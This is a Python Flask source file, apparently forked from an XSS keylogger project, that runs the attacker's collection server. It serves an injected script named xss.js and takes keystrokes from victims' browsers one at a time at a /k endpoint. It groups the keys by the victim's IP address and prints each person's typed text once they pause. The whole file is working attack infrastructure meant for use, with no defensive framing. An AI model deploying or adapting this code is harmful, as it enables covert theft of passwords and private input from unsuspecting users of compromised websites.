# app.py
# This code runs a Flask Server to receive the keystrokes
# Forked from https://github.com/EddieGerbs/XSS-Keylogger/

from flask import Flask, request, send_from_directory
from datetime import datetime
import time
import threading

app = Flask(__name__)

# Change to adjust the idle time. Currently it is 1500ms (1.5s)
IDLE_MS = 1500
CHECK_INTERVAL = 0.5

# Track per-client:
client_data = {}

@app.route('/xss.js')
def serve_xss():
    return send_from_directory('.', 'xss.js')

@app.route('/k', methods=['GET'])
def log_key():
    key = request.args.get('key', '')
    client = request.remote_addr
    now = time.time() * 1000

    if client not in client_data:
        client_data[client] = {"last_time": 0, "buffer": ""}

    client_data[client]["last_time"] = now
    if key:
        client_data[client]["buffer"] += key

    return '', 204  # No Content


def flush_idle_clients():
    """Background thread to print and clear buffers after inactivity."""
    while True:
        now = time.time() * 1000
        for client, data in list(client_data.items()):
            if data["buffer"] and (now - data["last_time"] > IDLE_MS):
                print(f"[{datetime.utcnow().isoformat()}] {client} : {data['buffer']}")
                data["buffer"] = ""
        time.sleep(CHECK_INTERVAL)


if __name__ == '__main__':
    # Start background flusher thread
    threading.Thread(target=flush_idle_clients, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
